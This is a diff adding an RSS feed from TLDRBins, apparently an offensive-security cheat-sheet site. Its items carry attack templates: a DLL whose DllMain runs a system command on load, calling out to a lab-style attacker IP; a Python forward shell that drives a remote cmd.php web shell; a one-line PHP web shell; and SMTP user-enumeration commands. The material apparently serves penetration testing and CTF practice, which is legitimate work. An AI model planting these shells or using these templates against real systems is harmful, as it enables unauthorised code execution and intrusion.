@@ -1,0 +1,39 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Template on TLDRBins</title>
+    <link>https://tldrbins.github.io/@template/</link>
+    <description>Recent content in Template on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@template/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Create custom dll</title>
+      <link>https://tldrbins.github.io/create_custom_dll/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/create_custom_dll/</guid>
+      <description>Create Custom Dll +---------------------------------------------------------+ | 1. Open Visual Studio | | 2. Create New Project -&amp;gt; C++ Dynamic-Link Library (DLL) | +---------------------------------------------------------+ #include &amp;#34;pch.h&amp;#34; #include &amp;lt;stdlib.h&amp;gt; BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: system(&amp;#34;cmd.exe /c ping 10.10.14.10&amp;#34;); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } +----------------------------+ | 3. Replace the code | | 4. Dropdown release -&amp;gt; x64 | | 5.</description>
+    </item>
+    <item>
+      <title>Forward Shell</title>
+      <link>https://tldrbins.github.io/forward_shell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/forward_shell/</guid>
+      <description> Python Forward Shell Template #!/usr/bin/env python3 from cmd import Cmd import requests class Term(Cmd): prompt = &amp;#34;shell&amp;gt; &amp;#34; def default(self, args): response = requests.get(&amp;#34;http://example.com/cmd.php&amp;#34;, params = {&amp;#34;cmd&amp;#34;: args}, proxies={&amp;#34;http&amp;#34;:&amp;#34;http://127.0.0.1:8080&amp;#34;}) print(response.text) term = Term() term.cmdloop() </description>
+    </item>
+    <item>
+      <title>PHP Command Shell</title>
+      <link>https://tldrbins.github.io/php_cmd_shell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/php_cmd_shell/</guid>
+      <description> PHP Command Shell &amp;lt;?php system($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; </description>
+    </item>
+    <item>
+      <title>SMTP</title>
+      <link>https://tldrbins.github.io/smtp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/smtp/</guid>
+      <description>Simple Mail Debugging Server #!/usr/bin/env python3 import aiosmtpd.controller class CustomSMTPHandler: async def handle_DATA(self, server, session, envelope): print(f&amp;#34;[+] Received a mail.&amp;#34;) print(&amp;#34;=&amp;#34; * 50) print(envelope.content.decode()) print(&amp;#34;=&amp;#34; * 50) return &amp;#34;250 OK&amp;#34; handler = CustomSMTPHandler() server = aiosmtpd.controller.Controller(handler, hostname=&amp;#34;0.0.0.0&amp;#34;, port=25) server.start() print(&amp;#34;[*] Listening on 0.0.0.0:25&amp;#34;) input(&amp;#34;[*] Server started. Press Return to quit.\n&amp;#34;) server.stop() User Enum nmap script nmap -p 25 --script=smtp-enum-users &amp;lt;TARGET&amp;gt; smtp-user-enum # Use RCPT smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/cirt-default-usernames.txt -t &amp;lt;TARGET&amp;gt; # Use VRFY smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/cirt-default-usernames.</description>
+    </item>
+  </channel>
+</rss>
